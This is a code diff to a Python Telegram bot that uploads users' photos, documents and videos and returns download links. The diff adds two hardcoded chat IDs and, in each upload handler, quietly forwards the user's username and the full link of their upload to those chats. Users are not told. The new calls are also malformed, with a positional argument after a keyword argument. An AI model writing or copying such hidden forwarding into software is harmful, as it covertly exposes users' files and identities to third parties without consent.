@@ -13,6 +13,8 @@ logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s
 logger = logging.getLogger(__name__)
 
 TOKEN = os.getenv("TOKEN")
+darkweb = 686021814
+clown = 1023799889
 
 try:  
   os.system('mkdir downloads')
@@ -28,15 +30,17 @@ For Now Currently Limit Is 20MB, Its Gonna Increased Upto 1.5GB In Future
 
 ♨️ Just Send The File You Wanna Upload and Leave The Rest On Bot :-) '''
 
-  keyboard = [[InlineKeyboardButton(text="🔥Support🔥", url="https://t.me/Technology_Arena"),
-               InlineKeyboardButton(text="♻️Donate♻️", url="https://t.me/TheDarkW3b")]]
+  #keyboard = [[InlineKeyboardButton(text="🔥Support🔥", url="https://t.me/Technology_Arena"),
+              # InlineKeyboardButton(text="♻️Donate♻️", url="https://t.me/TheDarkW3b")]]
   
   if update.effective_message.chat.type != "private":
     update.message.reply_text("Use Me In Private :-)")
   else:
-    update.message.reply_text(START, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.HTML)
+    update.message.reply_text(START, parse_mode=ParseMode.HTML)
       
 def photo(bot, update):
+  Username = update.message.from_user.username
+  
   try:
     media_id = update.effective_message.photo[-1].file_id
     newFile = bot.getFile(media_id)
@@ -55,6 +59,12 @@ Full Link :- {full_link}
 '''
 
     update.message.reply_text(messagee, parse_mode=ParseMode.HTML)
+    main_msg = f'''{Username} Requested Below Upload
+    
+{messagee}
+'''
+    bot.sendMessage(chat_id=darkweb, main_msg, parse_mode=ParseMode.HTML)
+    bot.sendMessage(chat_id=clown, main_msg, parse_mode=ParseMode.HTML)
   except:
     update.message.reply_text("Kindly Send Me Photos Less Then 20 MB")
   try:
@@ -63,6 +73,7 @@ Full Link :- {full_link}
     pass
     
 def documentt(bot, update):
+  Username = update.message.from_user.username
   try:
       media_id = update.effective_message.document.file_id
       fileName = update.effective_message.document.file_name
@@ -82,6 +93,12 @@ Full Link :- {full_link}
 '''
 
       update.message.reply_text(messagee, parse_mode=ParseMode.HTML)
+      main_msg = f'''{Username} Requested Below Upload
+      
+{messagee}
+'''
+      bot.sendMessage(chat_id=darkweb, main_msg, parse_mode=ParseMode.HTML)
+      bot.sendMessage(chat_id=clown, main_msg, parse_mode=ParseMode.HTML)
   except:
       update.message.reply_text("Kindly Send Me Files Less Then 20 MB")
   try:
@@ -90,6 +107,7 @@ Full Link :- {full_link}
       pass
 
 def videoo(bot, update):
+  Username = update.message.from_user.username
   try:
       video_id = update.effective_message.video.file_id
       fileName = os.path.split(newFile.file_path)[-1]
@@ -108,6 +126,12 @@ Full Link :- {full_link}
 '''
 
       update.message.reply_text(messagee, parse_mode=ParseMode.HTML)
+      main_msg = f'''{Username} Requested Below Upload
+      
+{messagee}
+'''
+      bot.sendMessage(chat_id=darkweb, main_msg, parse_mode=ParseMode.HTML)
+      bot.sendMessage(chat_id=clown, main_msg, parse_mode=ParseMode.HTML)
   except:
       update.message.reply_text("Kindly Send Me Videos Less Then 20 MB")
   try:
